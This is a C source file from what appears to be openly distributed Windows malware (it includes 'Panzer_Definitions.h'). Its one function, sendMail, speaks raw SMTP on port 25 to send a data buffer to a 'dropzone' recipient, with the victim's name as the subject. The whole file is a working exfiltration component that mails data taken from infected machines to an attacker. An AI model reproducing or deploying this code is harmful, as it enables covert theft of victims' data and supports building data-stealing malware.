/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



#include <windows.h>
#include <stdio.h>
#include "Panzer_Definitions.h"



char gSMTPError[24][128] = {"WSAStartup() failed.",
                            "gethostbyname() failed.",
                            "socket() failed.",
                            "connect() failed.",
                            "receiving SMTP serverbanner failed.",
                            "SMTP banner was not 220.",
                            "Unable to send HELO.",
                            "Unable to receive response to HELO.",
                            "HELO response hat not state 250.",
                            "Unable to send MAIL FROM.",
                            "Unable to receive response to MAIL FROM.",
                            "MAIL FROM response hat not state 250.",
                            "Unable to send RCPT TO.",
                            "Unable to receive response to RCPT TO.",
                            "RCPT TO response hat not state 250.",
                            "Unable to send DATA.",
                            "Unable to receive response to DATA.",
                            "DATA response hat not state 354.",
                            "Unable to send From + Subject header.",
                            "Unable to send data buffer.",
                            "Unable to send NLNL.",
                            "Unable to receive response to NLNL.",
                            "NLNL response hat not state 250.",
                            "Unable to send QUIT."
};







/*
 * Send email to dropzone
 *
 */

int sendMail(char *pSMTPServer, char* pRecipient, char* pSender, char *pVictimName, char* pDataBuffer, int pDataBufferLength)
{
  struct sockaddr_in lSockAddr;
  int lRetVal = 0;
  SOCKET lSocket = 0;
  int lBytesCounter = 0;
  char lTempBuffer[MAX_BUF_SIZE * 2 + 1];
  struct hostent *lHostEntry;
  WORD lVersionRequested;
  WSADATA lWSAData;
  SYSTEMTIME lSystemTime;
  char lDateString[MAX_BUF_SIZE + 1];
  char lSMTPHeader[MAX_BUF_SIZE + 1];


  /*
   * Prepare socket connection
   *
   */

  lVersionRequested = MAKEWORD(2, 2);

  if (WSAStartup(lVersionRequested, &lWSAData) != 0)
  {
    lRetVal = 1;
    goto END;
  }


  if ((lHostEntry = gethostbyname(pSMTPServer)) == NULL)
  {
    lRetVal = 2;
    goto END;
  }


  if ((lSocket = (SOCKET) socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    lRetVal = 3;
    goto END;
  }

  ZeroMemory(&lSockAddr, sizeof(lSockAddr));
  lSockAddr.sin_addr = *(struct in_addr*) lHostEntry->h_addr;
  lSockAddr.sin_family = AF_INET;
  lSockAddr.sin_port = htons(25);


  /*
   * Establish connection and receive SMTP banner of peer server.
   *
   */

  if (connect(lSocket, (struct sockaddr*) &lSockAddr, sizeof(lSockAddr)) == -1)
  {
    lRetVal = 4;
    goto END;
  }

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 5;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "220", 3))
  {
    lRetVal = 6;
    goto END;
  }


  /*
   * Send SMTP HELO
   *
   */

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  sprintf(lTempBuffer, "HELO FROM\r\n");
  if (send(lSocket, lTempBuffer, (int) strlen(lTempBuffer), 0) < 0)
  {
    lRetVal = 7;
    goto END;
  }

  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 8;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "250", 3))
  {
    lRetVal = 9;
    goto END;
  }



  /*
   * Send SMTP MAIL FROM
   *
   */

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  sprintf(lTempBuffer, "MAIL FROM:  <%s>\r\n", pSender);
  if (send(lSocket, lTempBuffer, (int) strlen(lTempBuffer), 0) < 0)
  {
    lRetVal = 10;
    goto END;
  }

  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 11;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "250", 3))
  {
    lRetVal = 12;
    goto END;
  }


  /*
   * Send SMTP RCPT TO:
   *
   */

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  sprintf(lTempBuffer, "RCPT TO: <%s>\r\n", pRecipient);
  if (send(lSocket, lTempBuffer, (int) strlen(lTempBuffer), 0) < 0)
  {
    lRetVal = 13;
    goto END;
  }

  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 14;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "250", 3))
  {
    lRetVal = 15;
    goto END;
  }


  /*
   * Send SMTP DATA
   *
   */

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  sprintf(lTempBuffer, "DATA\r\n");
  if (send(lSocket, lTempBuffer, (int) strlen(lTempBuffer), 0) < 0)
  {
    lRetVal = 16;
    goto END;
  }

  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 17;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "354", 3))
  {
    lRetVal = 18;
    goto END;
  }



  /*
   * Send SMTP DATA HEADER
   *
   */

  ZeroMemory(lSMTPHeader, sizeof(lSMTPHeader));
  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  ZeroMemory(lDateString, sizeof(lDateString));
  ZeroMemory(&lSystemTime, sizeof(lSystemTime));
  lBytesCounter = 0;


  sprintf(lSMTPHeader, "From: %s\r\nTo: %s\r\n", pSender, pRecipient);
  GetSystemTime(&lSystemTime);
  sprintf(lDateString, "Subject: %s\r\n\r\n", pVictimName) ;
  lstrcat(lSMTPHeader, lDateString);

  if (send(lSocket, lSMTPHeader, (int) strlen(lSMTPHeader), 0) < 0)
  {
    lRetVal = 19;
    goto END;
  }

  if (send(lSocket, pDataBuffer, (int) strlen(pDataBuffer), 0) < 0)
  {
    lRetVal = 20;
    goto END;
  }

  /*
   * Send SMTP DATA FINISH flag
   *
   */

  if (send(lSocket, "\r\n.\r\n", 5, 0) < 0)
  {
    lRetVal = 21;
    goto END;
  }

  ZeroMemory(lTempBuffer, sizeof(lTempBuffer));
  lBytesCounter = 0;
  if ((lBytesCounter = recv(lSocket, lTempBuffer, sizeof(lTempBuffer) - 1, 0)) < 0)
  {
    lRetVal = 22;
    goto END;
  }

  lTempBuffer[lBytesCounter] = '\0';
  if (strncmp(lTempBuffer, "250", 3))
  {
    lRetVal = 23;
    goto END;
  }


  /*
   * Send SMTP QUIT
   *
   */
  if (send(lSocket, "QUIT\r\n", 6, 0) < 0)
  {
    lRetVal = 24;
    goto END;
  }



END:

  if (lSocket > 0)
    closesocket(lSocket);

  WSACleanup();


  return(lRetVal);
}
